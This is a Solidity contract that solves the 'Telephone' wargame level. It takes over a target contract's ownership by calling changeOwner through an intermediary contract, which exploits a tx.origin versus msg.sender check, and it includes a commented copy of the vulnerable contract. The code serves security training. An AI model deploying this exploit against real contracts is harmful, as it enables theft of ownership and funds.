// 0xa00C1981123Bde19D05a6453Db432D4c026bC3ca

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract HackTelephone {
    Telephone public telephone;
    
    constructor(address _telephoneToBeHacked) public {
        telephone = Telephone(_telephoneToBeHacked);
    }
  
  // This alone is sufficient for the hack because tx.origin would be the original address i.e mine
  // while msg.sender in the hacked contract(telephone) would be this contract  address.
    function hackChangeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
    
    function hackChangeOwnerToContractAddress() public {
        telephone.changeOwner(address(this));
    }
    
    function hackChangeOwnerPlayerAddress() public {
        telephone.changeOwner(msg.sender);
    }
    
    function getPlayerAddress() public view returns(address){
        return msg.sender;
    }
    
    function getContractAddress() public view returns(address){
        return address(this);
    }
    
    function getTxOrigin() public view returns(address){
        return tx.origin;
    }
    
    
}

interface Telephone {
    function changeOwner(address _owner) external;
}


/*
contract Telephone {
    // address public txorigin;
    // address public msgSender;

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
      //txorigin = tx.origin;
     // msgSender = msgSender;
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
*/
